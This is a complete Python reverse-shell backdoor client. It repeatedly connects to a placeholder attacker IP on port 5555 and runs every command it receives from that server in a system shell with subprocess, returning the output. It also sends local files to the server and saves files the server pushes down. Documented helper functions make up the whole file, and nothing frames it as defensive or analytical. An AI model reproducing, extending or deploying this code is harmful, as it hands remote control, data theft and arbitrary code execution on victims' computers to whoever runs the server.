import socket
import time
import subprocess
import json
import os


def reliable_send(data):
    """
    Converts the data provided as a parameter into a JSON string and sends it to the server
    :param data: data that will be sent to the server.
    :return: None
    """
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    """
    Receives data from the server in JSON format and decodes it into a Python object.
    Reads data in blocks of 1024 bytes and accumulates until it can successfully decode into JSON using json.loads().
    :return: Returns the data received from the server.
    """
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    """
    Attempts to establish a connection with the remote server at 20-second intervals.
    If the connection fails, the function is called recursively until it succeeds.
    Once connected, it executes the shell() function to start interacting with the server.
    :return: None
    """
    while True:
        time.sleep(20)
        try:
            s.connect(('!!!Put your Host IP here!!!', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def upload_file(file_name):
    """
    Reads the contents of a specified file (file_name) in binary mode and sends it to the server.
    :param file_name: Name of the file to be sent to the server.
    :return: None
    """
    f = open(file_name, 'rb')
    s.send(f.read())


def download_file(file_name):
    """
    Receives a file from the server in blocks of 1024 bytes and writes it to a local file.
    Uses settimeout(1) to set a timeout for data reception, preventing the code from being blocked indefinitely.
    :param file_name: Name of the file to be downloaded.
    :return: None
    """
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def shell():
    """
    Main loop that waits for commands from the server.
    The commands can be:
        quit: Terminates the connection.
        clear: Does nothing, just gets ignored.
        cd <directory>: Changes the current directory.
        download <file>: Uploads a file from the client to the server.
        upload <file>: Downloads a file from the server to the client.
        Any other command: Executes the command in the operating system shell using subprocess.Popen() and sends the result back to the server.
    :return: None
    """
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


# Socket Creation and Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
